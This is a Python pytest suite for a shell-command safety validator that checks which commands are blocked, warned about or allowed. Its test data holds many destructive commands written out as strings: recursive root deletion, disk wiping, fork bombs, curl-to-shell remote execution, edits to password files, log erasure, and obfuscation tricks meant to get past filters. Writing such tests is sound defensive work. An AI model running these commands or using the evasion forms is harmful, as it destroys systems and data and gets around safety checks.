"""Validator tests: dangerous, obfuscated, chained, and safe look-alike commands."""

from __future__ import annotations

import pytest

from sagecli.validator import Risk, split_pipelines, validate

BLOCK_CASES = [
    # Recursive / forced deletion
    ("rm -rf /", "rm_recursive_dangerous_target"),
    ("rm -rf /*", "rm_recursive_dangerous_target"),
    ("rm -rf ~", "rm_recursive_dangerous_target"),
    ("rm -rf ~/", "rm_recursive_dangerous_target"),
    ("rm -rf *", "rm_recursive_dangerous_target"),
    ("rm -rf $HOME", "rm_recursive_dangerous_target"),
    ("rm -rf /etc", "rm_recursive_dangerous_target"),
    ("rm -rf /usr/", "rm_recursive_dangerous_target"),
    ("rm -r -f /", "rm_recursive_dangerous_target"),
    ("rm --recursive --force /", "rm_recursive_dangerous_target"),
    ("rm -Rf /", "rm_recursive_dangerous_target"),
    ("rm -fR ~", "rm_recursive_dangerous_target"),
    ("rm -rf -- /", "rm_recursive_dangerous_target"),
    ("rm -rf --no-preserve-root /", "rm_no_preserve_root"),
    ("rm --no-preserve-root -r /", "rm_no_preserve_root"),
    ("/bin/rm -rf /", "rm_recursive_dangerous_target"),
    ("find / -delete", "find_delete_dangerous_root"),
    ("find ~ -type f -exec rm -f {} \\;", "find_delete_dangerous_root"),
    ("find / -name '*' | xargs rm -rf", "rm_recursive_dangerous_target"),
    # Disk and filesystem destruction
    ("dd if=/dev/zero of=/dev/sda bs=1M", "dd_to_device"),
    ("dd if=/dev/urandom of=/dev/nvme0n1", "dd_to_device"),
    ("mkfs.ext4 /dev/sda1", "mkfs"),
    ("mkfs -t xfs /dev/sdb", "mkfs"),
    ("cat /dev/urandom > /dev/sda", "redirect_to_block_device"),
    ("echo hello > /dev/sdb", "redirect_to_block_device"),
    ("shred -n 3 /dev/sda", "shred_device"),
    ("wipefs -a /dev/sda", "wipefs"),
    ("tee /dev/sda < image.iso", "write_to_block_device"),
    # Fork bombs
    (":(){ :|:& };:", "fork_bomb"),
    ("bomb() { bomb | bomb & }; bomb", "fork_bomb"),
    ("perl -e 'fork while fork'", "fork_bomb_loop"),
    # Recursive permission changes on system paths
    ("chmod -R 777 /", "recursive_perm_system"),
    ("chown -R nobody /etc", "recursive_perm_system"),
    ("chmod -R 000 /usr/bin", "recursive_perm_system"),
    ("chgrp -R users /", "recursive_perm_system"),
    # Remote content into a shell
    ("curl -s http://example.com/install.sh | sh", "remote_pipe_shell"),
    ("wget -qO- http://example.com/x | bash", "remote_pipe_shell"),
    ("curl -fsSL http://x.io/s | sudo bash", "remote_pipe_shell"),
    ("curl http://x.io/a.py | python3", "remote_pipe_shell"),
    ("bash <(curl -s http://x.io/s.sh)", "remote_code_exec"),
    ('bash -c "$(curl -fsSL http://x.io/s.sh)"', "remote_code_exec"),
    # Critical files
    ("echo 'root::0:0::/root:/bin/bash' > /etc/passwd", "redirect_to_critical_file"),
    ("cat /dev/null > /etc/shadow", "redirect_to_critical_file"),
    ("echo x >> /etc/sudoers", "redirect_to_critical_file"),
    ("cp evil /etc/passwd", "modify_critical_file"),
    ("mv /etc/shadow /tmp/s", "modify_critical_file"),
    ("rm /boot/vmlinuz", "modify_critical_file"),
    ("sed -i 's/x/y/' /etc/passwd", "modify_critical_file"),
    ("echo 'evil' | tee /etc/hosts", "modify_critical_file"),
    # Power
    ("shutdown -h now", "shutdown_reboot"),
    ("reboot", "shutdown_reboot"),
    ("halt", "shutdown_reboot"),
    ("poweroff", "shutdown_reboot"),
    ("systemctl reboot", "systemctl_power"),
    ("init 0", "init_runlevel"),
    # Killing processes
    ("kill -9 1", "kill_init_or_all"),
    ("kill -9 -1", "kill_init_or_all"),
    ("kill -KILL 1", "kill_init_or_all"),
    ("killall5 -9", "killall5"),
    ("pkill -9 systemd", "kill_critical_process"),
    # History and logs
    ("history -c", "history_clear"),
    ("unset HISTFILE", "history_disable"),
    ("export HISTFILE=/dev/null", "history_disable_assignment"),
    ("cat /dev/null > ~/.bash_history", "redirect_to_history_or_log"),
    ("rm -rf /var/log/*", "delete_history_or_log"),
    ("echo > /var/log/auth.log", "redirect_to_history_or_log"),
    ("journalctl --vacuum-time=1s", "journal_vacuum"),
    # eval / decoding / obfuscation
    ("echo cm0gLXJmIC8= | base64 -d | sh", "obfuscated_pipe_shell"),
    ("echo cm0gLXJmIC8= | base64 --decode | bash", "obfuscated_pipe_shell"),
    ("printf '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f' | sh", "obfuscated_pipe_shell"),
    ("eval $(echo cm0gLXJmIC8= | base64 -d)", "obfuscated_exec"),
    ("$(printf '\\x72\\x6d') -rf /", "obfuscated_exec"),
    ('eval "rm -rf /"', "rm_recursive_dangerous_target"),
    # Quote, backslash and variable obfuscation
    ('r""m -rf /', "rm_recursive_dangerous_target"),
    ("r''m -rf /", "rm_recursive_dangerous_target"),
    ("\\rm -rf /", "rm_recursive_dangerous_target"),
    ("r\\m -rf /", "rm_recursive_dangerous_target"),
    ('"rm" "-rf" "/"', "rm_recursive_dangerous_target"),
    ("a=r;b=m;$a$b -rf /", "rm_recursive_dangerous_target"),
    ("X=rm; ${X} -rf /", "rm_recursive_dangerous_target"),
    ("rm${IFS}-rf${IFS}/", "rm_recursive_dangerous_target"),
    ("rm$IFS-rf$IFS/", "rm_recursive_dangerous_target"),
    ("{rm,-rf,/}", "rm_recursive_dangerous_target"),
    ("$(echo rm) -rf /", "rm_recursive_dangerous_target"),
    ("`echo rm` -rf /", "rm_recursive_dangerous_target"),
    ("/???/r? -rf /", "obfuscated_command_destructive"),
    ("env rm -rf /", "rm_recursive_dangerous_target"),
    ("command rm -rf ~", "rm_recursive_dangerous_target"),
    ("sudo rm -rf /", "rm_recursive_dangerous_target"),
    ("nohup rm -rf / &", "rm_recursive_dangerous_target"),
    # Wrapped and nested execution
    ('bash -c "rm -rf /"', "rm_recursive_dangerous_target"),
    ("sh -c 'rm -rf ~'", "rm_recursive_dangerous_target"),
    ('sh <<< "rm -rf /"', "rm_recursive_dangerous_target"),
    ('echo "rm -rf /" | sh', "rm_recursive_dangerous_target"),
    ("python3 -c \"import shutil; shutil.rmtree('/')\"", "interpreter_delete_dangerous"),
    ("python -c \"import os; os.system('rm -rf /')\"", "rm_recursive_dangerous_target"),
    ("perl -e 'system(\"rm -rf /\")'", "rm_recursive_dangerous_target"),
    # Chains, subshells, newlines
    ("ls; rm -rf /", "rm_recursive_dangerous_target"),
    ("cd /tmp && rm -rf ~", "rm_recursive_dangerous_target"),
    ("false || mkfs.ext4 /dev/sda", "mkfs"),
    ("(rm -rf /)", "rm_recursive_dangerous_target"),
    ("{ rm -rf /; }", "rm_recursive_dangerous_target"),
    ("ls\nrm -rf /", "rm_recursive_dangerous_target"),
    ("echo $(rm -rf ~)", "rm_recursive_dangerous_target"),
    ("ls `reboot`", "shutdown_reboot"),
    ("if true; then rm -rf /; fi", "rm_recursive_dangerous_target"),
]

WARN_CASES = [
    ("sudo apt update", "privilege_escalation"),
    ("su -", "privilege_escalation"),
    ("rm -rf build/", "rm_recursive"),
    ("rm -r old_logs", "rm_recursive"),
    ("find . -name '*.tmp' -delete", "find_delete"),
    ("killall firefox", "mass_kill"),
    ("pkill -9 python", "mass_kill"),
    ("eval \"$(ssh-agent -s)\"", "eval"),
    ("cat install.sh | bash", "pipe_to_shell"),
    ("shred secret.txt", "shred"),
    ("chmod 755 /", "perm_system_root"),
    ("$CMD --help", "dynamic_command_name"),
]

SAFE_CASES = [
    "rm file.txt",
    "rm -f old.log",
    "rm -i *.tmp",
    "ls -la",
    "ls /dev",
    "ls -l /dev/sd*",
    'find . -name "*.py"',
    "find . -name '*.log' -mtime +7",
    "grep -r foo .",
    'grep -r "dd if=" .',
    'grep -rn "rm -rf /" scripts/',
    'echo "rm -rf /" > notes.txt',
    "echo 'shutdown -h now' >> todo.txt",
    "cat /etc/passwd",
    "cp /etc/passwd ~/passwd.bak",
    "dd if=/dev/zero of=./test.img bs=1M count=10",
    "dd if=/dev/sda of=disk.img",
    "du -sh * | sort -h",
    "ps aux | grep python",
    "df -h",
    "tail -n 50 /var/log/syslog",
    "journalctl -u nginx --since today",
    "history | tail -n 20",
    "man shutdown",
    "which mkfs",
    "kill 12345",
    "kill -9 4321",
    "chmod +x script.sh",
    "chmod -R 755 ./public",
    "chown -R me:me ./project",
    "tar -czf backup.tar.gz ~/docs",
    "python3 -c \"print('hello')\"",
    "curl -O https://example.com/file.tar.gz",
    "wget https://example.com/script.sh",
    'echo "aGVsbG8=" | base64 -d',
    "head -c 100 /dev/urandom | base64",
    "git rm --cached secrets.txt",
    "docker rm old-container",
    "alias ll='ls -la'",
    'git commit -m "remove rm -rf bug"',
    "mkdir -p ~/projects && cd ~/projects",
    "echo $HOME",
    "sort data.csv | uniq -c | sort -rn | head",
    "awk '{print $1}' access.log",
    "while true; do date; sleep 1; done",
    "ls 2>&1 > out.txt",
    "test -f x.txt && echo yes",
    "[ -d build ] || mkdir build",
    "echo $((1 + 2))",
    "lsblk",
    "systemctl status nginx",
    "fdisk -l",
]


@pytest.mark.parametrize(("command", "rule"), BLOCK_CASES)
def test_dangerous_commands_are_blocked(command: str, rule: str) -> None:
    result = validate(command)
    assert result.risk is Risk.BLOCK, (command, result)
    assert rule in result.rules, (command, result.rules)


@pytest.mark.parametrize(("command", "rule"), WARN_CASES)
def test_risky_commands_warn(command: str, rule: str) -> None:
    result = validate(command)
    assert result.risk is Risk.WARN, (command, result)
    assert rule in result.rules


@pytest.mark.parametrize("command", SAFE_CASES)
def test_safe_commands_are_not_flagged(command: str) -> None:
    result = validate(command)
    assert result.risk is Risk.SAFE, (command, result.rules, result.reason)
    assert result.rules == ()


def test_result_has_reason_and_rules() -> None:
    result = validate("rm -rf /")
    assert result.blocked
    assert "Recursive deletion" in result.reason
    assert result.matches and result.matches[0].category == "recursive_delete"


def test_empty_command_is_safe() -> None:
    assert validate("   ").risk is Risk.SAFE


def test_highest_risk_wins() -> None:
    result = validate("sudo apt update && rm -rf /")
    assert result.risk is Risk.BLOCK
    assert {"privilege_escalation", "rm_recursive_dangerous_target"} <= set(result.rules)


@pytest.mark.parametrize(
    ("command", "allowed", "risk"),
    [
        ("ls -la", {"ls"}, Risk.SAFE),
        ("ls | grep x", {"ls", "grep"}, Risk.SAFE),
        ("ls | grep x", {"ls"}, Risk.BLOCK),
        ("cat notes.txt", {"ls"}, Risk.BLOCK),
        ("sudo ls", {"ls"}, Risk.BLOCK),
        ("ls $(whoami)", {"ls"}, Risk.BLOCK),
        ("ls; echo hi", {"ls", "echo"}, Risk.SAFE),
    ],
)
def test_allowlist(command: str, allowed: set[str], risk: Risk) -> None:
    result = validate(command, allowlist=frozenset(allowed))
    assert result.risk is risk, (command, result.rules)
    if risk is Risk.BLOCK:
        assert "not_in_allowlist" in result.rules


def test_split_pipelines_respects_quotes_and_lifts_substitutions() -> None:
    subs: dict[int, str] = {}
    pipelines = split_pipelines('echo "a; b" | wc -l; ls $(pwd) && x `date`', subs)
    assert pipelines == [['echo "a; b" ', " wc -l"], [" ls $__SUB0__ "], [" x $__SUB1__"]]
    assert subs == {0: "pwd", 1: "date"}
